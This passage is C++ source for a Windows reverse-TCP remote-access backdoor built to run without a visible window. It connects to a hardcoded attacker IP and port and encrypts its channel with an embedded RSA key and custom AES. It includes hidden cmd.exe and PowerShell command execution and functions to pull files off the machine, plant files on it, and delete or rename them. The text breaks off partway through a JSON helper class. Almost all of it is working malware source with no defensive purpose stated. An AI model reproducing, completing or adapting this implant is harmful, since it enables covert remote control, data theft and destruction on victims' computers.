// x86_64-w64-mingw32-g++ -o ReverseTCP_RSA.exe ReverseTCP_RSA.cpp -lws2_32 -lbcrypt -static -static-libgcc -static-libstdc++ -O2 -mwindows

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <stdexcept>
#include <algorithm>
#include <fstream>
#include <sstream>
#include <filesystem>
#include <iomanip>
#include <chrono>
#include <ctime>
#include <cstdlib>
#include <map>
#include <cstring>
#include <cstdint>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif


const char* SERVER_IP = "192.168.1.107";
const int SERVER_PORT = 1111;

const std::string AUTH_ID = "6444dd00-a1e3-47f9-96cf-b7282e8fa743";

const std::string RSA_PUBLIC_KEY_PEM =
    "-----BEGIN PUBLIC KEY-----\n"
    "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEArzyg7KTBT/MpciW4UKSk\n"
    "jWUz6y87YLNktzndjJvIpYTReAzK3ewzJihvz5l/uF4dCPZVhl9zvQW/9X501SmU\n"
    "nCPz4F+iiunt4mXVqv4rK3/QAM5UH3gUwTdFTnUCYMR94ZoR0NvKfIDnDV6sZxiR\n"
    "ETOwK5w+aQNF6H1/NcB1UuPKz1GpLtY9jcYYV6x+ihT1V/rGfFHdpNySHD6og+z1\n"
    "NSq0D3JiGAuSSfhhV+aPCZ8By8eh735r50WCiBFUw3Bd6oPjyeKDwUVBgGip+3UH\n"
    "0tlqFIZxHBPTCSZ6zJDW+40XWLlRSk5z1PLBJokiEQLiyxmA34rbmUzsRBD32L9y\n"
    "jwIDAQAB\n"
    "-----END PUBLIC KEY-----\n";


class Base64 {
private:
    static const std::string BASE64_CHARS;
    static inline bool is_base64(unsigned char c) {
        return (isalnum(c) || (c == '+') || (c == '/'));
    }
public:
    static std::string decode(const std::string& encoded_string) {
        int in_len = (int)encoded_string.size();
        int i = 0, j = 0, in_ = 0;
        unsigned char char_array_4[4], char_array_3[3];
        std::string ret;
        while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
            char_array_4[i++] = encoded_string[in_]; in_++;
            if (i == 4) {
                for (i = 0; i < 4; i++) char_array_4[i] = (unsigned char)BASE64_CHARS.find(char_array_4[i]);
                char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
                char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
                char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
                for (i = 0; i < 3; i++) ret += char_array_3[i];
                i = 0;
            }
        }
        if (i) {
            for (j = i; j < 4; j++) char_array_4[j] = 0;
            for (j = 0; j < 4; j++) char_array_4[j] = (unsigned char)BASE64_CHARS.find(char_array_4[j]);
            char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
            char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
            char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];
            for (j = 0; j < i - 1; j++) ret += char_array_3[j];
        }
        return ret;
    }
    static std::string encode(const std::string& input) {
        std::string result;
        int i = 0, j = 0;
        unsigned char char_array_3[3], char_array_4[4];
        for (i = 0; i < (int)input.length(); i++) {
            char_array_3[j++] = input[i];
            if (j == 3) {
                char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
                char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
                char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
                char_array_4[3] = char_array_3[2] & 0x3f;
                for (j = 0; j < 4; j++) result += BASE64_CHARS[char_array_4[j]];
                j = 0;
            }
        }
        if (j) {
            for (int k = j; k < 3; k++) char_array_3[k] = 0;
            char_array_4[0] = (char_array_3[0] & 0xfc) >> 2;
            char_array_4[1] = ((char_array_3[0] & 0x03) << 4) + ((char_array_3[1] & 0xf0) >> 4);
            char_array_4[2] = ((char_array_3[1] & 0x0f) << 2) + ((char_array_3[2] & 0xc0) >> 6);
            char_array_4[3] = char_array_3[2] & 0x3f;
            for (int k = 0; k < j + 1; k++) result += BASE64_CHARS[char_array_4[k]];
            while (j++ < 3) result += '=';
        }
        return result;
    }
};
const std::string Base64::BASE64_CHARS =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


namespace tiny_aes {
    static const uint8_t sbox[256] = {
        0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
        0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
        0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
        0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
        0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
        0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
        0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
        0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
        0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
        0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
        0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
        0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
        0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
        0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
        0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
        0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16
    };
    static const uint8_t rsbox[256] = {
        0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
        0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
        0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
        0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
        0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
        0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
        0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
        0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
        0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
        0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
        0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
        0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
        0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
        0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
        0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
        0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d
    };
    static const uint8_t Rcon[15] = { 0x8d,0x01,0x02,0x04,0x08,0x10,0x20,0x40,0x80,0x1b,0x36,0x6c,0xd8,0xab,0x4d };

    struct AES_ctx {
        uint8_t RoundKey[240];
        uint8_t Iv[16];
        int Nk;
        int Nr;
    };

    static uint8_t xtime(uint8_t x) { return ((x << 1) ^ (((x >> 7) & 1) ? 0x1b : 0)); }

    static uint8_t mul(uint8_t x, uint8_t y) {
        uint8_t result = 0;
        while (y) { if (y & 0x01) result ^= x; x = xtime(x); y >>= 1; }
        return result;
    }

    static void KeyExpansion(uint8_t* RoundKey, const uint8_t* Key, int Nk) {
        int Nr = Nk + 6;
        int total_words = 4 * (Nr + 1);
        unsigned i, j, k;
        uint8_t tempa[4];
        for (i = 0; i < (unsigned)Nk; ++i) {
            RoundKey[i*4+0] = Key[i*4+0]; RoundKey[i*4+1] = Key[i*4+1];
            RoundKey[i*4+2] = Key[i*4+2]; RoundKey[i*4+3] = Key[i*4+3];
        }
        for (i = Nk; i < (unsigned)total_words; ++i) {
            k = (i - 1) * 4;
            tempa[0] = RoundKey[k+0]; tempa[1] = RoundKey[k+1];
            tempa[2] = RoundKey[k+2]; tempa[3] = RoundKey[k+3];
            if (i % Nk == 0) {
                const uint8_t u8tmp = tempa[0];
                tempa[0]=tempa[1]; tempa[1]=tempa[2]; tempa[2]=tempa[3]; tempa[3]=u8tmp;
                tempa[0]=sbox[tempa[0]]; tempa[1]=sbox[tempa[1]];
                tempa[2]=sbox[tempa[2]]; tempa[3]=sbox[tempa[3]];
                tempa[0] ^= Rcon[i/Nk];
            } else if (Nk > 6 && i % Nk == 4) {
                tempa[0]=sbox[tempa[0]]; tempa[1]=sbox[tempa[1]];
                tempa[2]=sbox[tempa[2]]; tempa[3]=sbox[tempa[3]];
            }
            j = i * 4;
            RoundKey[j+0] = RoundKey[(i-Nk)*4+0] ^ tempa[0];
            RoundKey[j+1] = RoundKey[(i-Nk)*4+1] ^ tempa[1];
            RoundKey[j+2] = RoundKey[(i-Nk)*4+2] ^ tempa[2];
            RoundKey[j+3] = RoundKey[(i-Nk)*4+3] ^ tempa[3];
        }
    }

    static void AES_init_ctx_iv(AES_ctx* ctx, const uint8_t* key, const uint8_t* iv, int key_len) {
        int Nk;
        if (key_len == 16) Nk = 4;
        else if (key_len == 24) Nk = 6;
        else Nk = 8;
        ctx->Nk = Nk;
        ctx->Nr = Nk + 6;
        KeyExpansion(ctx->RoundKey, key, Nk);
        memcpy(ctx->Iv, iv, 16);
    }

    static void SubBytes(uint8_t* state) { for (int i=0;i<16;++i) state[i]=sbox[state[i]]; }
    static void InvSubBytes(uint8_t* state) { for (int i=0;i<16;++i) state[i]=rsbox[state[i]]; }
    static void ShiftRows(uint8_t* state) {
        uint8_t temp;
        temp=state[1];state[1]=state[5];state[5]=state[9];state[9]=state[13];state[13]=temp;
        temp=state[2];state[2]=state[10];state[10]=temp;temp=state[6];state[6]=state[14];state[14]=temp;
        temp=state[15];state[15]=state[11];state[11]=state[7];state[7]=state[3];state[3]=temp;
    }
    static void InvShiftRows(uint8_t* state) {
        uint8_t temp;
        temp=state[13];state[13]=state[9];state[9]=state[5];state[5]=state[1];state[1]=temp;
        temp=state[14];state[14]=state[6];state[6]=temp;temp=state[10];state[10]=state[2];state[2]=temp;
        temp=state[3];state[3]=state[7];state[7]=state[11];state[11]=state[15];state[15]=temp;
    }
    static void MixColumns(uint8_t* state) {
        for (int i=0;i<4;++i) {
            uint8_t a=state[4*i+0],b=state[4*i+1],c=state[4*i+2],d=state[4*i+3];
            state[4*i+0]=mul(0x02,a)^mul(0x03,b)^mul(0x01,c)^mul(0x01,d);
            state[4*i+1]=mul(0x01,a)^mul(0x02,b)^mul(0x03,c)^mul(0x01,d);
            state[4*i+2]=mul(0x01,a)^mul(0x01,b)^mul(0x02,c)^mul(0x03,d);
            state[4*i+3]=mul(0x03,a)^mul(0x01,b)^mul(0x01,c)^mul(0x02,d);
        }
    }
    static void InvMixColumns(uint8_t* state) {
        for (int i=0;i<4;++i) {
            uint8_t a=state[4*i+0],b=state[4*i+1],c=state[4*i+2],d=state[4*i+3];
            state[4*i+0]=mul(0x0e,a)^mul(0x0b,b)^mul(0x0d,c)^mul(0x09,d);
            state[4*i+1]=mul(0x09,a)^mul(0x0e,b)^mul(0x0b,c)^mul(0x0d,d);
            state[4*i+2]=mul(0x0d,a)^mul(0x09,b)^mul(0x0e,c)^mul(0x0b,d);
            state[4*i+3]=mul(0x0b,a)^mul(0x0d,b)^mul(0x09,c)^mul(0x0e,d);
        }
    }
    static void AddRoundKey(uint8_t* state, const uint8_t* RoundKey, int round) {
        for (int i=0;i<16;++i) state[i] ^= RoundKey[(round*16)+i];
    }
    static void AES_encrypt(const uint8_t* in, uint8_t* out, const AES_ctx* ctx) {
        uint8_t state[16]; memcpy(state, in, 16);
        AddRoundKey(state, ctx->RoundKey, 0);
        for (int round=1; round<ctx->Nr; ++round) {
            SubBytes(state); ShiftRows(state); MixColumns(state); AddRoundKey(state, ctx->RoundKey, round);
        }
        SubBytes(state); ShiftRows(state); AddRoundKey(state, ctx->RoundKey, ctx->Nr);
        memcpy(out, state, 16);
    }
    static void AES_decrypt(const uint8_t* in, uint8_t* out, const AES_ctx* ctx) {
        uint8_t state[16]; memcpy(state, in, 16);
        AddRoundKey(state, ctx->RoundKey, ctx->Nr);
        for (int round=ctx->Nr-1; round>0; --round) {
            InvShiftRows(state); InvSubBytes(state); AddRoundKey(state, ctx->RoundKey, round); InvMixColumns(state);
        }
        InvShiftRows(state); InvSubBytes(state); AddRoundKey(state, ctx->RoundKey, 0);
        memcpy(out, state, 16);
    }
    static void AES_CBC_encrypt_buffer(AES_ctx* ctx, uint8_t* buf, size_t length) {
        uint8_t* iv = ctx->Iv;
        for (size_t i=0; i<length; i+=16) {
            for (int j=0;j<16;++j) buf[i+j] ^= iv[j];
            AES_encrypt(buf+i, buf+i, ctx);
            iv = buf+i;
        }
        memcpy(ctx->Iv, iv, 16);
    }
    static void AES_CBC_decrypt_buffer(AES_ctx* ctx, uint8_t* buf, size_t length) {
        uint8_t storeNextIv[16];
        for (size_t i=0; i<length; i+=16) {
            memcpy(storeNextIv, buf+i, 16);
            AES_decrypt(buf+i, buf+i, ctx);
            for (int j=0;j<16;++j) buf[i+j] ^= ctx->Iv[j];
            memcpy(ctx->Iv, storeNextIv, 16);
        }
    }
}

class AESCipherTCP {
private:
    std::vector<uint8_t> key;
    int key_len;

    std::vector<uint8_t> pad(const std::vector<uint8_t>& data) {
        size_t pad_len = 16 - (data.size() % 16);
        std::vector<uint8_t> padded = data;
        padded.insert(padded.end(), pad_len, static_cast<uint8_t>(pad_len));
        return padded;
    }

    std::vector<uint8_t> unpad(const std::vector<uint8_t>& data) {
        if (data.empty()) return data;
        uint8_t pad_len = data.back();
        if (pad_len > 16 || pad_len == 0) return data;
        return std::vector<uint8_t>(data.begin(), data.end() - pad_len);
    }

public:
    AESCipherTCP(const std::vector<uint8_t>& key_bytes) : key(key_bytes), key_len((int)key_bytes.size()) {
        if (key.size() != 16 && key.size() != 24 && key.size() != 32) {
            throw std::runtime_error("Key must be 16, 24, or 32 bytes long");
        }
    }

    std::vector<uint8_t> encrypt(const std::string& raw) {
        std::vector<uint8_t> data(raw.begin(), raw.end());
        data = pad(data);
        std::vector<uint8_t> iv(16);
        for (size_t i=0;i<16;++i) iv[i] = rand() % 256;
        std::vector<uint8_t> result = iv;
        tiny_aes::AES_ctx ctx;
        tiny_aes::AES_init_ctx_iv(&ctx, key.data(), iv.data(), key_len);
        tiny_aes::AES_CBC_encrypt_buffer(&ctx, data.data(), data.size());
        result.insert(result.end(), data.begin(), data.end());
        return result;
    }

    std::vector<uint8_t> encrypt_bytes(const std::vector<uint8_t>& raw) {
        std::vector<uint8_t> data = pad(raw);
        std::vector<uint8_t> iv(16);
        for (size_t i=0;i<16;++i) iv[i] = rand() % 256;
        std::vector<uint8_t> result = iv;
        tiny_aes::AES_ctx ctx;
        tiny_aes::AES_init_ctx_iv(&ctx, key.data(), iv.data(), key_len);
        tiny_aes::AES_CBC_encrypt_buffer(&ctx, data.data(), data.size());
        result.insert(result.end(), data.begin(), data.end());
        return result;
    }

    std::string decrypt(const std::vector<uint8_t>& enc) {
        if (enc.size() < 16) throw std::runtime_error("Invalid encrypted data");
        std::vector<uint8_t> iv(enc.begin(), enc.begin()+16);
        std::vector<uint8_t> data(enc.begin()+16, enc.end());
        if (data.size() % 16 != 0) throw std::runtime_error("Invalid data length");
        tiny_aes::AES_ctx ctx;
        tiny_aes::AES_init_ctx_iv(&ctx, key.data(), iv.data(), key_len);
        tiny_aes::AES_CBC_decrypt_buffer(&ctx, data.data(), data.size());
        data = unpad(data);
        return std::string(data.begin(), data.end());
    }
};


class RSACipher {
private:
    BCRYPT_ALG_HANDLE hAlg;
    BCRYPT_KEY_HANDLE hKey;
    DWORD cbKeyObject;
    std::vector<BYTE> keyObject;
    bool valid;

public:
    RSACipher() : hAlg(nullptr), hKey(nullptr), cbKeyObject(0), valid(false) {

        std::string b64;
        {
            std::istringstream iss(RSA_PUBLIC_KEY_PEM);
            std::string line;
            bool in_body = false;
            while (std::getline(iss, line)) {
                if (line.find("-----BEGIN") != std::string::npos) { in_body = true; continue; }
                if (line.find("-----END") != std::string::npos) { in_body = false; continue; }
                if (in_body) {
                    while (!line.empty() && (line.back()=='\r'||line.back()=='\n')) line.pop_back();
                    b64 += line;
                }
            }
        }
        std::string der = Base64::decode(b64);
        if (der.empty()) return;


        if (!NT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_RSA_ALGORITHM, NULL, 0))) return;



        std::vector<uint8_t> derBytes(der.begin(), der.end());
        size_t idx = 0;
        if (derBytes.size() < 4 || derBytes[0] != 0x30) return;

        auto read_len = [&](size_t& i) -> size_t {
            size_t len = derBytes[i++];
            if (len & 0x80) {
                int nbytes = len & 0x7F;
                len = 0;
                for (int k = 0; k < nbytes; ++k) len = (len << 8) | derBytes[i++];
            }
            return len;
        };


        idx = 1;
        size_t outer_len = read_len(idx);
        (void)outer_len;


        if (derBytes[idx] != 0x30) return;
        idx++;
        size_t alg_len = read_len(idx);
        idx += alg_len;  

        if (derBytes[idx] != 0x03) return;
        idx++;
        size_t bit_len = read_len(idx);
        (void)bit_len;
        idx++; 


        if (derBytes[idx] != 0x30) return;
        idx++;
        size_t rsa_seq_len = read_len(idx);
        (void)rsa_seq_len;


        if (derBytes[idx] != 0x02) return;
        idx++;
        size_t n_len = read_len(idx);
        size_t n_off = idx;
        idx += n_len;


        if (derBytes[idx] != 0x02) return;
        idx++;
        size_t e_len = read_len(idx);
        size_t e_off = idx;


        const uint8_t* mod_ptr = derBytes.data() + n_off;
        size_t mod_len = n_len;
        while (mod_len > 0 && *mod_ptr == 0x00) { mod_ptr++; mod_len--; }

        const uint8_t* exp_ptr = derBytes.data() + e_off;
        size_t exp_len = e_len;
        while (exp_len > 0 && *exp_ptr == 0x00) { exp_ptr++; exp_len--; }


        ULONG bitLen = (ULONG)(mod_len * 8);
        BCRYPT_RSAKEY_BLOB header{};
        header.Magic = BCRYPT_RSAPUBLIC_MAGIC;
        header.BitLength = bitLen;
        header.cbPublicExp = (ULONG)exp_len;
        header.cbModulus = (ULONG)mod_len;
        header.cbPrime1 = 0;
        header.cbPrime2 = 0;

        std::vector<BYTE> blob;
        blob.resize(sizeof(header) + exp_len + mod_len);      
        memcpy(blob.data(), &header, sizeof(header));
        memcpy(blob.data() + sizeof(header), exp_ptr, exp_len);
        memcpy(blob.data() + sizeof(header) + exp_len, mod_ptr, mod_len);


        if (!NT_SUCCESS(BCryptImportKeyPair(hAlg, NULL, BCRYPT_RSAPUBLIC_BLOB,
                                            &hKey, blob.data(), (ULONG)blob.size(), 0))) {
            return;
        }

        valid = true;
    }

    ~RSACipher() {
        if (hKey) BCryptDestroyKey(hKey);
        if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    }

    bool is_valid() const { return valid; }


    std::vector<uint8_t> encrypt(const std::vector<uint8_t>& plaintext) {
        std::vector<uint8_t> result;
        if (!valid) return result;


        ULONG cbResult = 0;
        BCRYPT_OAEP_PADDING_INFO oaepInfo{};
        oaepInfo.pszAlgId = BCRYPT_SHA1_ALGORITHM;
        oaepInfo.pbLabel = NULL;
        oaepInfo.cbLabel = 0;

        NTSTATUS st = BCryptEncrypt(hKey,
                                    (PUCHAR)plaintext.data(), (ULONG)plaintext.size(),
                                    &oaepInfo,
                                    NULL, 0,
                                    NULL, 0, &cbResult,
                                    BCRYPT_PAD_OAEP);
        if (!NT_SUCCESS(st)) return result;

        result.resize(cbResult);
        ULONG cbWritten = 0;
        st = BCryptEncrypt(hKey,
                           (PUCHAR)plaintext.data(), (ULONG)plaintext.size(),
                           &oaepInfo,
                           NULL, 0,
                           result.data(), cbResult, &cbWritten,
                           BCRYPT_PAD_OAEP);
        if (!NT_SUCCESS(st)) { result.clear(); return result; }
        result.resize(cbWritten);
        return result;
    }

    std::vector<uint8_t> encrypt_str(const std::string& s) {
        return encrypt(std::vector<uint8_t>(s.begin(), s.end()));
    }
};


void send_data(SOCKET sock, const std::vector<uint8_t>& data) {
    uint32_t length = static_cast<uint32_t>(data.size());
    std::vector<uint8_t> header(4);
    header[0] = (length >> 24) & 0xFF;
    header[1] = (length >> 16) & 0xFF;
    header[2] = (length >> 8) & 0xFF;
    header[3] = length & 0xFF;
    send(sock, reinterpret_cast<const char*>(header.data()), 4, 0);
    if (!data.empty())
        send(sock, reinterpret_cast<const char*>(data.data()), (int)data.size(), 0);
}

std::vector<uint8_t> recv_all(SOCKET sock, size_t n) {
    std::vector<uint8_t> data(n);
    size_t received = 0;
    while (received < n) {
        int result = recv(sock, reinterpret_cast<char*>(&data[received]), (int)(n - received), 0);
        if (result <= 0) throw std::runtime_error("Connection closed");
        received += result;
    }
    return data;
}

std::vector<uint8_t> recv_data(SOCKET sock) {
    auto raw_length = recv_all(sock, 4);
    uint32_t length = (raw_length[0] << 24) | (raw_length[1] << 16) | (raw_length[2] << 8) | raw_length[3];
    return recv_all(sock, length);
}

std::vector<uint8_t> string_to_vector(const std::string& str) {
    return std::vector<uint8_t>(str.begin(), str.end());
}


std::string run_cmd_command(const std::string& cmd) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    std::string full_cmd = "cmd.exe /c " + cmd;
    std::vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] CMD execution error: " + std::to_string(error);
    }

    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    std::string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != std::string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + std::to_string(exitCode) + "]";
    return output.empty() ? "[+] Command executed (no output)" : output;
}

std::string run_powershell_command(const std::string& ps_cmd) {
    std::string escaped_cmd;
    for (char c : ps_cmd) {
        if (c == '"') escaped_cmd += "\\\"";
        else escaped_cmd += c;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;

    HANDLE hStdoutRd = nullptr, hStdoutWr = nullptr;
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) return "[-] Failed to create pipe";
    SetHandleInformation(hStdoutRd, HANDLE_FLAG_INHERIT, 0);

    PROCESS_INFORMATION pi{};
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hStdoutWr;
    si.hStdError = hStdoutWr;

    std::string full_cmd = "powershell.exe -NoProfile -NonInteractive -Command " + escaped_cmd;
    std::vector<char> cmd_line(full_cmd.begin(), full_cmd.end());
    cmd_line.push_back('\0');

    BOOL success = CreateProcessA(nullptr, cmd_line.data(), nullptr, nullptr, TRUE,
                                  CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(hStdoutWr);

    if (!success) {
        DWORD error = GetLastError();
        CloseHandle(hStdoutRd);
        return "[-] PowerShell execution error: " + std::to_string(error);
    }

    std::string result;
    DWORD bytesRead;
    char buffer[4096];
    while (ReadFile(hStdoutRd, buffer, sizeof(buffer) - 1, &bytesRead, nullptr) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    DWORD exitCode = 0;
    WaitForSingleObject(pi.hProcess, INFINITE);
    GetExitCodeProcess(pi.hProcess, &exitCode);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hStdoutRd);

    std::string output = result;
    size_t start = output.find_first_not_of(" \t\r\n");
    if (start != std::string::npos) {
        size_t end = output.find_last_not_of(" \t\r\n");
        output = output.substr(start, end - start + 1);
    }
    if (exitCode != 0) output += "\n[Exit Code: " + std::to_string(exitCode) + "]";
    return output.empty() ? "[+] PowerShell command executed (no output)" : output;
}


std::string download_file(const std::string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) return "ERROR: File not found: " + filepath;
        if (std::filesystem::is_directory(filepath)) return "ERROR: Cannot download directory: " + filepath;

        std::ifstream file(filepath, std::ios::binary);
        if (!file) return "ERROR: Cannot open file: " + filepath;

        std::vector<unsigned char> file_data((std::istreambuf_iterator<char>(file)),
                                             std::istreambuf_iterator<char>());
        file.close();

        std::string filename = std::filesystem::path(filepath).filename().string();
        size_t filesize = file_data.size();
        std::string encoded = Base64::encode(std::string((char*)file_data.data(), file_data.size()));

        return "file-data:" + filename + "|" + std::to_string(filesize) + "|" + encoded;
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::string upload_file(const std::string& filepath, const std::string& filedata_b64) {
    try {
        std::string decoded_data = Base64::decode(filedata_b64);
        std::vector<unsigned char> file_data(decoded_data.begin(), decoded_data.end());

        std::filesystem::path path_obj(filepath);
        std::filesystem::create_directories(path_obj.parent_path());

        std::ofstream file(filepath, std::ios::binary);
        if (!file) return "ERROR: Cannot write file: " + filepath;
        file.write(reinterpret_cast<const char*>(file_data.data()), file_data.size());
        file.close();

        return "SUCCESS: File uploaded to " + filepath;
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::string delete_file(const std::string& filepath) {
    try {
        if (!std::filesystem::exists(filepath)) return "ERROR: Path does not exist: " + filepath;
        if (std::filesystem::is_directory(filepath)) {
            std::filesystem::remove_all(filepath);
            return "SUCCESS: Deleted directory " + filepath;
        } else {
            std::filesystem::remove(filepath);
            return "SUCCESS: Deleted file " + filepath;
        }
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}

std::string rename_file(const std::string& old_path, const std::string& new_path) {
    try {
        if (!std::filesystem::exists(old_path)) return "ERROR: Source path does not exist: " + old_path;
        std::filesystem::rename(old_path, new_path);
        return "SUCCESS: Renamed to " + new_path;
    } catch (const std::exception& e) {
        return "ERROR: " + std::string(e.what());
    }
}


class Json {
private:
